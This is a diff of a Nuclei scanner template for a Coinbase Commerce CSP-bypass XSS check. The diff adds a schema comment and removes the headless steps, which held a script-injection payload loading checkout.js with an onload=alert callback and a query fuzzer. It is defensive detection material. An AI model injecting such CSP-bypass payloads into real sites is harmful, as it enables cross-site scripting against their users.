@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: coinbase-commerce-csp-bypass
 
 info:
@@ -30,26 +31,5 @@ headless:
   - steps:
       - action: navigate
         args:
-          url: "{{BaseURL}}"
 
-      - action: waitdialog
-        name: coinbase_commerce_csp_xss
-        args:
-          max-duration: 5s
-
-    payloads:
-      injection:
-        - '<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>'
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{url_encode(injection)}}"
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "coinbase_commerce_csp_xss == true"
 # digest: 4a0a004730450220022f5fb2c2561e8b400e4a1d15ab9ee596ef6e352bc738b5ecd339fca68a92d7022100fe56c58b11a41dea007b2ecda246bdc324406fd9bfd5114996c6bab146331479:922c64590222798bb761d5b6d8e72950
